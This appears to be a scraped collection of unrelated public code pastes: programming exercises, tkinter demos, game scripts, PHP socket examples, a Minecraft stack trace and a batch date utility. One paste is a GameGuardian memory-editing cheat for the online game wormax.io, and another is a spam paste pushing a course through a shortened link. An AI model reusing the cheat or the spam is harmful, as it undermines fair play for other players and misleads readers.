            for (const auto [document_id, _] : word_to_document_freqs_.at(word)) {
                document_to_relevance.erase(document_id);
            }
        }

        vector<Document> matched_documents;
        for (const auto [document_id, relevance] : document_to_relevance) {
            matched_documents.push_back(
                { document_id, relevance, documents_.at(document_id).rating });
        }
        return matched_documents;
    }
};

template <typename Iterator>
class Paginator {
public:
    Paginator(Iterator begin, Iterator end, size_t page_size) : begin_(begin), end_(end), page_size_(page_size) {
        size_t total_size = distance(begin, end);
        page_count_ = total_size / page_size;
        if (total_size % page_size != 0) {
            page_count_++;
        }
    }

    auto begin() const {
        return begin_;
    }

    auto end() const {
        size_t remaining_size = distance(begin_, end_);
        return begin_ + min(page_size_, remaining_size);
    }

    size_t size() const {
        return page_count_;
    }

private:
    Iterator begin_, end_;
    size_t page_size_ = 0, page_count_ = 0;
};

template <typename Container>
auto Paginate(const Container& c, size_t page_size) {
    return Paginator(c.begin(), c.end(), page_size);
}



int main() {
    SearchServer search_server(""and with""s);
    search_server.AddDocument(1, ""funny pet and nasty rat""s, DocumentStatus::ACTUAL, { 7, 2, 7 });
    search_server.AddDocument(2, ""funny pet with curly hair""s, DocumentStatus::ACTUAL, { 1, 2, 3 });
    search_server.AddDocument(3, ""big cat nasty hair""s, DocumentStatus::ACTUAL, { 1, 2, 8 });
    search_server.AddDocument(4, ""big dog cat Vladislav""s, DocumentStatus::ACTUAL, { 1, 3, 2 });
    search_server.AddDocument(5, ""big dog hamster Borya""s, DocumentStatus::ACTUAL, { 1, 1, 1 });
    const auto search_results = search_server.FindTopDocuments(""curly dog""s);
    int page_size = 2;
    const auto pages = Paginate(search_results, page_size);
    // Выводим найденные документы по страницам
    for (auto page = pages.begin(); page != pages.end(); ++page) {
        cout << *page << endl;
        cout << ""Page break""s << endl;
    }
}"
uraU0iGq,Turtles,archosaur,Lua,Friday 19th of January 2024 02:19:30 PM CDT,"os.loadAPI(""Brave.lua"")
os.loadAPI(""IPSO.lua"")
os.loadAPI(""Config.lua"")
os.loadAPI(""Arch.lua"")

local Device_type = """"
local Tab = 0

local Console_tab = multishell.getCurrent()
local Pc_label = os.getComputerLabel()

---Setup for the main loop.
---Primarly for checking Config and tasks than only run one time.
function Startup()
	Brave.Clear_term()
	print(""Turtle scripts"")
	print(""PC ID: "" .. tostring(os.getComputerID()))
	print(""PC label: "" .. tostring(os.getComputerLabel()))

	if Config == nil then
		print(""No config.lua file found. run 'Update' to add config file"")
		while true do end
    end

	if Config.Device_type == nil then
		print(""No device type found in Config"")
		while true do end
	end
	Device_type = Config.Device_type
	print(""Device type: "" .. Device_type)

	Brave.Modem.open(Config.Channel_network)
end

---Generate Alive message.
---This message contains general information about the device.
---The content can be captured by the backend to show activity.
---Does not send the message.
---@return String #Package ready to be send over the network
function Generate_alive_message()
	local object1 = IPSO.Generate_object(IPSO.Object_list.Device, 0, IPSO.Resource_list.Set_UUID, os.getComputerID())
	local object2 = IPSO.Generate_object(IPSO.Object_list.Device, 0, IPSO.Resource_list.Set_Label, os.getComputerLabel())
	local object3 = IPSO.Generate_object(IPSO.Object_list.Device, 0, IPSO.Resource_list.Set_Block_type, Brave.Get_device_type())
	local object7 = IPSO.Generate_object(IPSO.Object_list.Device, 0, IPSO.Resource_list.Set_Type, Device_type)
	local object4 = IPSO.Generate_object(IPSO.Object_list.GPS_x, 0, IPSO.Resource_list.Set_value, 0) -- GPS not yet implemented
	local object5 = IPSO.Generate_object(IPSO.Object_list.GPS_y, 0, IPSO.Resource_list.Set_value, 0) -- GPS not yet implemented
	local object6 = IPSO.Generate_object(IPSO.Object_list.GPS_z, 0, IPSO.Resource_list.Set_value, 0) -- GPS not yet implemented
	local object8 = IPSO.Generate_object(IPSO.Object_list.Protocol, 0, IPSO.Resource_list.Set_SW_version, Brave.Protocol_version)

	local Package = Brave.Generate_package({object1, object2, object3, object4, object5, object6, object7, object8}, Brave.Package_types.Broadcast, {})
	return Package
end

function Generate_inventory_message()
	local Object_table = {}

	for Slot = 1, 16, 1 do
		turtle.select(Slot)
		table.insert(Object_table, IPSO.Generate_object(IPSO.Object_list.Inventory_internal, Slot, IPSO.Resource_list.Set_Item_name, Arch.Get_item_name()))
		table.insert(Object_table, IPSO.Generate_object(IPSO.Object_list.Inventory_internal, Slot, IPSO.Resource_list.Set_Stack_count, turtle.getItemCount()))
	end

	local Inventory_message = Brave.Generate_package(Object_table, Brave.Package_types.Broadcast, {})
	return Inventory_message
end

function main()
	Startup()

	if Device_type == ""Turtle:Mining"" then
        term.clear()
        term.setCursorPos(1,1)
        term.write(""Distance: "")
        local Distance = read()
        print(""User input: "" .. Distance)

		local Inventory_message = Generate_inventory_message()
		print(type(Inventory_message))
		print(textutils.serialize(Inventory_message))
		Brave.Modem.Transmit(Config.Channel_network, Inventory_message)
	end
end

main()"
CR4Vq5wY,# tk_4x4_ButtonLayout_demo.py,here2share,Python,Friday 19th of January 2024 02:09:33 PM CDT,"# tk_4x4_ButtonLayout_demo.py

import tkinter as tk

def on_enter(event):
	event.widget.config(bg=""red"")
	event.widget.config(fg=""white"")

def on_leave(event):
    widget = event.widget
    if button_colors[widget] == 'green':
        widget.config(bg=""green"")
        widget.config(fg=""white"")
    else:
        widget.config(bg=""yellow"")
        widget.config(fg=""gray"")

def on_click(event):
    widget = event.widget
    if button_colors[widget] == 'green':
        widget.config(bg=""yellow"")
        widget.config(fg=""gray"")
        button_colors[widget] = 'yellow'
    else:
        widget.config(bg=""green"")
        widget.config(fg=""white"")
        button_colors[widget] = 'green'

root = tk.Tk()
root.geometry(""400x400+10+10"")
root.title(""# tk_4x4_ButtonLayout_demo.py"")

button_colors = {}  # Dictionary to store button colors

for i in range(4):
    root.grid_rowconfigure(i, weight=1)
    root.grid_columnconfigure(i, weight=1)
    for j in range(4):
        button = tk.Button(root, text=f""{i*4+j+1}"", font=(""Arial"", 50), fg=""gray"", bg=""yellow"")
        button.grid(row=i, column=j, sticky=""nsew"")
        button.bind(""<Enter>"", on_enter)
        button.bind(""<Leave>"", on_leave)
        button.bind(""<Button-1>"", on_click)
        button_colors[button] = 'yellow'  # Initial color

root.mainloop()
"
wDZdBP7d,Arma bomb detonation midair,Gamenator,SQF,Friday 19th of January 2024 01:53:01 PM CDT,"[thisTrigger] spawn {    
  if (( getposatl vehicle player) select 2 > 500) then{    
    private _position = vehicle player getRelPos [0,0]; 
    private _newPos = _position vectorAdd [0,0,1000]; 
    _missileDir = _newpos vectorFromTo getPosATL vehicle player;     
    _missile = createVehicle [""vn_bomb_2000_mk84_he_ammo"", _newpos, [], 0, ""CAN_COLLIDE""];     
  triggerammo _missile;
   [_missile, vehicle player] spawn {     
    params [""_missile"", ""_tgt""];     
    sleep 0.1;     
    _missile setMissileTarget _tgt;     
          }; 
    }else{};      
}"
3RBhn19h,Untitled,sissou123,C#,Friday 19th of January 2024 01:52:21 PM CDT,"Complete C# Unity Game Developer 2D
Learn Unity in C# & Code Your First Five 2D Video Games for Web, Mac & PC. The Tutorials Cover Tilemap 
This course started as a runaway success on Kickstarter and has gone on to become the most popular and most watched Unity game development course on Udemy. 
for more:https://cuty.io/bkGGiucQP0I5
"
SXGz6WWJ,# tk_bountyhunter.py,here2share,Python,Friday 19th of January 2024 01:13:24 PM CDT,"# tk_bountyhunter.py

from tkinter import *
import random
import time
from tkinter import messagebox

# Set up the tkinter window
window = Tk()
window.title(""Bounty Hunter"")
window.geometry(""600x600+10+10"")

# Define colors
COLOR_BLACK = ""#000000""
COLOR_WHITE = ""#FFFFFF""
COLOR_RED = ""#FF0000""
COLOR_BLUE = ""#0000FF""
COLOR_GREEN = ""#00FF00""
COLOR_GRAY = ""#C0C0C0""

# Define player properties
player_size = 20
player_x = 290
player_y = 290

# Define goal properties
goal_size = 20
goal_x = random.randint(20, 580)
goal_y = random.randint(20, 580)

# Define game properties
goals_achieved = 0
time_limit = 30
time_left = time_limit
game_running = False

canvas = Canvas(window, width=600, height=600, bg=COLOR_WHITE)
canvas.pack()

MAIN_GOALS = [(x, y) for x in range(60, 540, 60) for y in range(40, 560, 40)]
goals = []

def draw_objects():
    canvas.delete(ALL)
    canvas.create_text(300, 300, text=time_left, font=(""Arial"", 300), fill=COLOR_GRAY)
    canvas.create_rectangle(player_x - player_size, player_y - player_size, player_x + player_size, player_y + player_size, fill=COLOR_BLUE)
    canvas.create_rectangle(goal_x - goal_size, goal_y - goal_size, goal_x + goal_size, goal_y + goal_size, fill=COLOR_RED)

def move_player(event):
    global player_x, player_y
    player_x = event.x
    player_y = event.y
	
def move_target():
	global goal_x, goal_y
	if not goals:
		random.shuffle(MAIN_GOALS)
		goals[:] = MAIN_GOALS[:]
	goal_x, goal_y = goals.pop()

canvas.bind(""<Motion>"", move_player)

game_running = True
init = True
while game_running:
	if init:
		start_time = time.time()
		goals_achieved = 0
		time_left = time_limit
		move_target()
		init = False
		
	current_time = int(time.time() - start_time)
	if current_time - 1 < time_limit:
		time_left = time_limit - current_time
		if player_x - player_size < goal_x < player_x + player_size and player_y - player_size < goal_y < player_y + player_size:
			goals_achieved += 1
			move_target()
	else:
		message = ""Game Over!\nYou achieved a total of {} goals."".format(goals_achieved)
		message += ""\n\nDo you want to play again?""
		game_running = init = messagebox.askyesno(""Game Over"", message)

	draw_objects()
	canvas.update()

window.destroy()"
GisMN3ap,WORMAX.IO SCRIPT,maxhib43,Lua,Friday 19th of January 2024 01:00:29 PM CDT,"gg.alert(""script by jarly, TG: @depre55ed0"")
gg.searchNumber(""0.25"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0) -- ищем нужную нам функцию в игре
gg.processResume() -- возвращаем процес

revert = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil) -- выполняем действие используя то что искали
local t = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil)
for i, v in ipairs(t) do
    if v.flags == gg.TYPE_FLOAT then
        v.value = ""4""
        v.freeze = true
    end
end
gg.addListItems(t)
t = nil

gg.processResume()

gg.clearResults()

gg.clearList() -- строки выше фиксят краш

gg.searchNumber(""0.10"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0) -- ищем нужную нам функцию в игре
gg.processResume() -- возвращаем процес

revert = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil) -- выполняем действие используя то что искали
local t = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil)
for i, v in ipairs(t) do
    if v.flags == gg.TYPE_FLOAT then
        v.value = ""15""
        v.freeze = true
    end
end
gg.addListItems(t)
t = nil

gg.processResume()

gg.clearResults()

gg.clearList() -- строки выше фиксят краш

gg.searchNumber(""0.25"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0) -- ищем нужную нам функцию в игре
gg.processResume() -- возвращаем процес

revert = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil) -- выполняем действие используя то что искали
local t = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil)
for i, v in ipairs(t) do
    if v.flags == gg.TYPE_FLOAT then
        v.value = ""0.6""
        v.freeze = true
    end
end
gg.addListItems(t)
t = nil

gg.processResume()

gg.clearResults()

gg.clearList() -- строки выше фиксят краш

gg.searchNumber(""0.5"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0) -- ищем нужную нам функцию в игре
gg.processResume() -- возвращаем процес

revert = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil) -- выполняем действие используя то что искали
local t = gg.getResults(1000, nil, nil, nil, nil, nil, nil, nil, nil)
for i, v in ipairs(t) do
    if v.flags == gg.TYPE_FLOAT then
        v.value = ""15""
        v.freeze = true
    end
end
gg.addListItems(t)
t = nil

gg.processResume()

gg.clearResults()

gg.clearList() -- строки выше фиксят краш

"
fyUinFrp,Cristal Shop,SaNik74,C#,Friday 19th of January 2024 12:52:59 PM CDT,"class Program
{
    static void Main(string[] args)
    {
        int coints;
        int cristals;
        int cristalPrice = 10;

        Console.WriteLine(""Введите кол-во золотых монет:"");
        coints = Convert.ToInt32(Console.ReadLine());

        Console.WriteLine($""Вы можете купить {coints/cristalPrice} кристалов."" +
            $""\nСколько кристалов вы будете покупать?"");
        cristals = Convert.ToInt32(Console.ReadLine());

        coints -= cristals * cristalPrice;

        Console.WriteLine($""У вас есть:"" +
            $""\nМонет - {coints}"" +
            $""\nКристалов - {cristals}"");
    }
}"
AsiF3DL4,Untitled,toorr2p,PHP,Friday 19th of January 2024 12:37:16 PM CDT,"<?php
//Клиентские функции
try {
    echo 'Создание сокета ... ';         
    $ws = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    if ($ws < 0) {             
        throw new Exception('socket_create() failed: '.socket_strerror(socket_last_error()).""\n"");         
    } else {             
        echo ""Сокет успешно создан!\n"";         
    }

    echo 'Подключаемся к сокету на сервере ...\n';         
    $wsconn = socket_connect($ws, '38.35.138.4', 2222);

    if ($wsconn === false) {             
        throw new Exception('socket_connect() failed: '.socket_strerror(socket_last_error()).""\n"");         
    } else {
        echo ""Соединение установлено!\n"";

        //Передаем данные
        $data = ""{var:client_value}\n"";
        $byteOut = socket_write($ws, $data, strlen($data));

        if ($byteOut === false) {
            echo "" Ошибка."";           
            throw new Exception('socket_send() failed: '.socket_strerror(socket_last_error()).""\n"");         
        } else {             
            echo ""отправлено "" . $byteOut . "" байт.\n"";
        }

        //Читаем ответ от сервера
        printf(""<p> < %s </p>"", socket_read($ws, 1000, PHP_NORMAL_READ));

        //Закрываем сокет
        if (isset($ws)) {
            echo 'Close socket ... ';
            socket_close($ws);
            echo ""OK\n"";
        }

    }
}catch (Exception $e) {         
    echo ""\nError: "".$e->getMessage();
}
?>"
rbCaJZRb,Untitled,toorr2p,PHP,Friday 19th of January 2024 12:35:09 PM CDT,"<?php
try {
    $ws = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    if ($ws === false) {
        throw new Exception('socket_create() failed: '.socket_strerror(socket_last_error()).""\n"");
    }else{

        $host_ip = gethostbyname('0.0.0.0');
        socket_bind($ws, $host_ip, 2222);

        socket_listen($ws, 5);

        $connection = @socket_accept($ws);

        //read from websocket
        printf(""< %s\n"", socket_read($connection, 1000, PHP_NORMAL_READ));

        //send to client
        $data = ""{var:server_value}\n"";
        $byteOut = socket_write($connection, $data, strlen($data));

        if ($byteOut === false) {
            echo "" Ошибка."";
            throw new Exception('socket_send() failed: '.socket_strerror(socket_last_error()).""\n"");         
        } else {             
            echo ""отправлено "" . $byteOut . "" байт.\n"";
        }
        
    }
}catch (Exception $e) {         
    echo ""\nError: "".$e->getMessage();
}
?>"
UcJAB1NF,Spices,drak138,JavaScript,Friday 19th of January 2024 12:28:20 PM CDT,"function spiceMustFlow(startingPoint){
let days=0
let mined=0
while(startingPoint>=100){
    mined+=startingPoint-26
    days++
    startingPoint-=10
}
console.log(days)
if(mined!=0){
console.log(mined-26)
}
else{
    console.log(mined)
}
}
spiceMustFlow(450)"
7SkYym1d,Untitled,z_rr,Python,Friday 19th of January 2024 12:24:29 PM CDT,"from collections import deque

rows, columns = [int(x) for x in input().split()]
snake = deque(x for x in input())

matrix = [['*' for _ in range(columns)] for _ in range(rows)]

for i in range(rows):
    for j in range(columns):

        curr_snake_el = snake.popleft()
        matrix[i][j] = curr_snake_el
        snake.append(curr_snake_el)

    if i % 2 == 1:
        matrix[i].reverse()

[print("""".join(row)) for row in matrix]
"
Lqm45wbg,Gladiator,drak138,JavaScript,Friday 19th of January 2024 12:16:24 PM CDT,"function gladiator(loseCount,helmetPrice,swordPrice,shieldPrice,armorPrice){
    let expenses=0
    let shieldsBroken=0
    for(let i=1;i<=loseCount;i++){
        if(i%2==0){
            expenses+=helmetPrice
            if(i%3==0){
                shieldsBroken++
                expenses+=swordPrice+shieldPrice
            }
        }
        else if(i%3==0){
            expenses+=swordPrice
        }
        if(shieldsBroken%2==0&&shieldsBroken>0){
            expenses+=armorPrice
            shieldsBroken=0
        }
    }
    console.log(`Gladiator expenses: ${expenses.toFixed(2)} aureus`)
}"
vFA80VGg,Untitled,z_rr,Python,Friday 19th of January 2024 12:15:51 PM CDT,"from collections import deque

rows, columns = [int(x) for x in input().split()]
snake = deque(x for x in input())

matrix = [['*' for _ in range(columns)] for _ in range(rows)]

for i in range(rows):
    for j in range(columns):

        curr_snake_el = snake.popleft()
        matrix[i][j] = curr_snake_el
        snake.append(curr_snake_el)

    if i % 2 == 1:
        matrix[i].reverse()

[print(*row) for row in matrix]"
fPUNkTib,FlowerShop,MladenKarachanov,Java,Friday 19th of January 2024 11:48:44 AM CDT,"package ProgrammingBasics2;

import java.util.Scanner;

public class FlowerShop {
    public static void main(String[] args) {
        Scanner scanner= new Scanner(System.in);
        int magnolias = Integer.parseInt(scanner.nextLine());
        int hyacinths = Integer.parseInt(scanner.nextLine());
        int roses = Integer.parseInt(scanner.nextLine());
        int cacti = Integer.parseInt(scanner.nextLine());
        double aGift = Double.parseDouble(scanner.nextLine());
        double sum = (magnolias*3.25)+(hyacinths*4.00)+(roses*3.50)+(cacti*8.00);
        double taxes = sum*0.05;
        double result = sum-taxes;
        if(aGift <= result){
            double diff = Math.abs(aGift-result);
        System.out.printf(""She is left with %.0f leva."",Math.floor(diff));
        }else{
            double diff1=Math.abs(aGift-result);
            System.out.printf(""She will have to borrow %.0f leva."",Math.ceil(diff1));
        }

    }
}
"
Rt3pWr4k,# tk_bouncing_sq_RndColors.py,here2share,Python,Friday 19th of January 2024 11:44:00 AM CDT,"# tk_bouncing_sq_RndColors.py

import tkinter as tk
import random

ww = 1000
hh = 300

# Create the main window
window = tk.Tk()
window.geometry(f""{ww}x{hh}+0+0"")
window.title(""Bouncing Square Random Colors"")

# Create the canvas
canvas = tk.Canvas(window, width=ww, height=hh)
canvas.pack()

# Set up variables
dy = 20
dx = 20
x1 = 0
y1 = 0

# Function to handle the animation
def animate():
    global x1, y1, dx, dy

    x1 = x1 + dx
    y1 = y1 + dy
    x2 = x1 + 100
    y2 = y1 + 100

    if x1 < 0:
        dx = -1 * dx
    if y1 < 0:
        dy = -1 * dy
    if x1 > ww-100:
        dx = -1 * dx
    if y1 > hh-100:
        dy = -1 * dy

    color = ""#{:06x}"".format(random.randint(0, 0xffffff))

    canvas.delete(""square"")
    canvas.create_rectangle(x1, y1, x2, y2, fill=color, tags=""square"")

    window.after(100, animate)

# Call the animate function to start the animation
animate()

# Run the main loop
window.mainloop()"
yEe2DVk0,EconomyShopGUI-Premium v5.6.3 - FireworkOptions,C4BR3R4,YAML,Friday 19th of January 2024 11:30:38 AM CDT,"Could not pass event InventoryCloseEvent to EconomyShopGUI-Premium v5.6.3
java.lang.ClassCastException: class org.bukkit.craftbukkit.v1_20_R2.inventory.CraftInventoryCustom cannot be cast to class me.gypopo.economyshopgui.inventorys.editor.items.FireworkOptions (org.bukkit.craftbukkit.v1_20_R2.inventory.CraftInventoryCustom is in unnamed module of loader java.net.URLClassLoader @5a10411; me.gypopo.economyshopgui.inventorys.editor.items.FireworkOptions is in unnamed module of loader 'EconomyShopGUI-Premium-5.6.3.jar' @70111dcf)
	at me.gypopo.economyshopgui.methodes.ItemEditor.saveFireworkOptions(ItemEditor.java:71) ~[EconomyShopGUI-Premium-5.6.3.jar:?]
	at me.gypopo.economyshopgui.events.MenuHandler.onMenuClose(MenuHandler.java:901) ~[EconomyShopGUI-Premium-5.6.3.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor1156.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.20.2-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:81) ~[paper-api-1.20.2-R0.1-SNAPSHOT.jar:git-Paper-318]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.20.2-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.20.2.jar:git-Paper-318]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:126) ~[paper-1.20.2.jar:git-Paper-318]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:615) ~[paper-api-1.20.2-R0.1-SNAPSHOT.jar:?]
	at org.bukkit.craftbukkit.v1_20_R2.event.CraftEventFactory.handleInventoryCloseEvent(CraftEventFactory.java:1680) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.handleContainerClose(ServerGamePacketListenerImpl.java:2866) ~[?:?]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.handleContainerClose(ServerGamePacketListenerImpl.java:2859) ~[?:?]
	at net.minecraft.network.protocol.game.ServerboundContainerClosePacket.handle(ServerboundContainerClosePacket.java:15) ~[?:?]
	at net.minecraft.network.protocol.game.ServerboundContainerClosePacket.a(ServerboundContainerClosePacket.java:10) ~[?:?]
	at net.minecraft.network.protocol.PacketUtils.lambda$ensureRunningOnSameThread$0(PacketUtils.java:53) ~[?:?]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:153) ~[?:?]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[?:?]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1324) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.MinecraftServer.d(MinecraftServer.java:193) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:126) ~[?:?]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1301) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1294) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:136) ~[?:?]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1272) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1160) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:315) ~[paper-1.20.2.jar:git-Paper-318]
	at java.lang.Thread.run(Unknown Source) ~[?:?]"
tXberP3z,change,SaNik74,C#,Friday 19th of January 2024 10:54:04 AM CDT,"class Program
{
    static void Main(string[] args)
    {
        string name = ""Torvalds"";
        string surname = ""Linus"";
        string tempName;

        Console.WriteLine($""{name} {surname}"");

        tempName = surname;
        surname = name;
        name = tempName;

        Console.WriteLine($""{name} {surname}"");
    }
}"
9BinGGKD,utility2.bat,GlobalAccessSoftware,Batch,Friday 19th of January 2024 10:45:52 AM CDT,"

  :::::::::::::::::::::
  :::  RC9 Update!  :::
  :::::::::::::::::::::

  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: utility2.bat custom by -JpE- 202307170943  :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  :::   :::   :::   :::   /\   :::   :::   :::   :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: Design Notes For Day of Week as Word:      :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: Old Farmers Need these 3 vars to work with :::
  ::: PLus the 3 tables to get dow, key, century :::
  ::: ========================================== :::
  ::: Last two of year / 4 + Last 2 of year +    :::
  ::: Day of Month + Month code & century code   :::
  ::: (for 2000 thru 2099 add 1) pre 1900 add 2  :::
  ::: pre 1800 add 2 more & Divide sum by 7.     :::
  ::: REMAINDER is day of the week; Sunday == 1  :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: This ^ Formula is Crucial In The ^ Coding! :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/ :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: Rev8.6.7:  NEW FEATURES AND FIXES          :::
  ::: if dateToLookup string is passed in, then  :::
  ::: the year must be 10 digits with this       :::
  ::: NOTE: RC9 Allows years up to 2,147,483,647 :::
  ::: format: date2Lookup=""1923-01-09""           :::
  ::: If the 2nd arg isn't sent in the call,     :::
  ::: then it goes with RIGHT THIS MILLISECOND!  :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::

    ::::::::::::::::::::::::::::::::::::::::::::::::::
    ::: JAFO: Get day of week for date as a word!  :::
    ::::::::::::::::::::::::::::::::::::::::::::::::::


    if not defined vers set vers=v8.7.0.16 20240117073112 by -JpE-
    if not defined testwell set /a testwell=1
    if not defined util2 set util2=""%bats%\utility2.bat""
    if not defined util3 set util3=""%bats%\utility3.bat""
  

:dowword <string weekdayVar2Return, string dateToLookupOptional>
  setlocal & set ""weekday=%~1"" & set ""date1=%~2""
  if not defined date1 set /a year4=(%date:~0,4%)

      if not defined date1 call :fetch year2 month day
      ::: Either or, never neither ^v nor.
      if defined date1 call :parsedate %date1% year4 year2 month day
      set /a ly=9 & call :monthkey key %month% %year4%

    if %key% gtr 99 set /a ly=0 & set /a key-=100
    ::: REM if %ly% equ 0 echo . & echo It is LeapYear! & echo .
    set /a sum1=(%year2% / 4 + %year2%)
    set /a sum2=(%sum1% + %day% + %key%)
      call :century %year4% adj

        ::: Mod:Fix ::: if Leap Year but before Leap Day!
        ::: v8.7.0.15 20240117073112 by -JpE-
        if %ly% equ 0 if %month% lss 3 set /a adj-=1

  if %adj% lss 9 set /a sum2=(%sum2%+%adj%)
  if %adj% equ 9 set ""weekday=Y10k Problem""
  if %adj% gtr 9 set /a key=7
  if %adj% neq 7 set /a dowk=(%sum2% %% 7%)

    if %key% neq 7 call :getdow %dowk% weekday
      if %key% equ 7 set ""weekday=ERROR-47c""
        if %key% equ 7 call :errr

  endlocal & set ""%~1=%weekday%""
  exit /b %errorlevel%

  
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::: Adapted month and day if year is more than 4 digits. -ed
::: fix Y10k, Y100k, Y100k, Y1mk, etc.
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::: If date string was passed in parse it to get
::: the 4 vars year4, year2, month, day; my way.
::: Mod: if more than a 4 digit year and make scalable.
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:parsedate <string datePassedIn, int year4Returned, int year2Returned, int monthReturned, int dayReturned>
  setlocal & set ""date1=%~1"" & set ""y4=%~2""
  set ""y2=%~3"" & set ""mo=%~4"" & set ""dy=%~5""
  if exist %util3% call %util3% datelen :strlen %date1%

      set /a len=(%datelen%-6)
      set /a l2=(%len%-2)
      set /a admo=(%len%+1)
      set /a addy=(%len%+4)
 
  ::: How long is just the Year string in characters?
  if %datelen% equ 10 (
    set /a ""y4=%date1:~0,4%""
    set /a ""y2=%date1:~2,2%""
    set ""mo=%date1:~5,2%""
    set ""dy=%date1:~8,2%""
  )
  if %datelen% gtr 10 (
    REM setlocal EnableExtensions
    REM setlocal EnableDelayedExpansion
      set y4=!date1:~0,%len%!
      set y2=!date1:~%l2%,2!
if %testwell% gtr 3 echo . & echo now testing over 4 digit years. And l2 == %l2% & echo . & pause & echo .
    set mo=!date1:~%admo%,2!
    set dy=!date1:~%addy%,2!
    REM setlocal DisableDelayedExpansion
  )
if %testwell% gtr 3 echo . & echo parsedate: y4 == %y4%, y2 == %y2%, admo == %admo%, addy == %addy%
if %testwell% gtr 3 echo len == %len%, mo == %mo%, dy == %dy% & echo .
  if ""%mo:~0,1%"" equ "" "" set /a ""mo=%mo:~1,1%""
  if ""%mo:~0,1%"" equ """" set /a ""mo=%mo:~1,1%""
  if ""%mo:~0,1%"" equ ""0"" set /a ""mo=%mo:~1,1%""
  if ""%dy:~0,1%"" equ "" "" set /a ""dy=%dy:~1,1%""
  if ""%dy:~0,1%"" equ """" set /a ""dy=%dy:~1,1%""
  if ""%dy:~0,1%"" equ ""0"" set /a ""dy=%dy:~1,1%""
  
if %testwell% gtr 3 echo . & echo ok here: y4 == %y4%, y2 == %y2%
if %testwell% gtr 3 echo mo == %mo%, dy == %dy% & echo . & pause & echo .

  endlocal & set ""%~2=%y4%"" & set ""%~3=%y2%"" & set ""%~4=%mo%"" & set ""%~5=%dy%""
  exit /b %errorlevel%


:::::::::::::::::::[ Begin The Century Group ]:::::::::::::::::::

:century <string year4, int adjWeThink>
  setlocal & set /a ""yr4=%~1""
  if %yr4% lss 0 echo overload & if exist %util3% call %util3% t :overload 0
  if %yr4% gtr 2147483646 echo overload & if exist %util3% call %util3% t :overload 0
    set /a millenium=%yr4:~0,1%
    set /a century=%yr4:~1,1%
    ::: IF year is over 4 digits long?
      if %yr4% gtr 9999 call :y10k
    ::: then alter this ^ millenium and century accordingly, same namespace.
    set /a evenm=(%millenium% %% 2%)
    set /a evenc=(%century% %% 2%)
  if %century% gtr 7 set /a century=(%century%-8)
  if %century% lss 8 if %century% gtr 3 set /a century=(%century%-4)
  if %evenm% leq 0 (
    if %century% equ 3 set /a adj=0
    if %century% equ 2 set /a adj=2
    if %century% equ 1 set /a adj=4
    if %century% equ 0 set /a adj=-1)
  if %evenm% gtr 0 (
    if %century% equ 3 set /a adj=4
    if %century% equ 2 set /a adj=-1
    if %century% equ 1 set /a adj=0
    if %century% equ 0 set /a adj=2)
  if %yr4% lss 1753 set /a adjust=9 & echo . & echo Results for years before 1753 weren't gregorian.
  if %yr4% leq 6000 if %yr4% gtr 2100 call :crosscheck
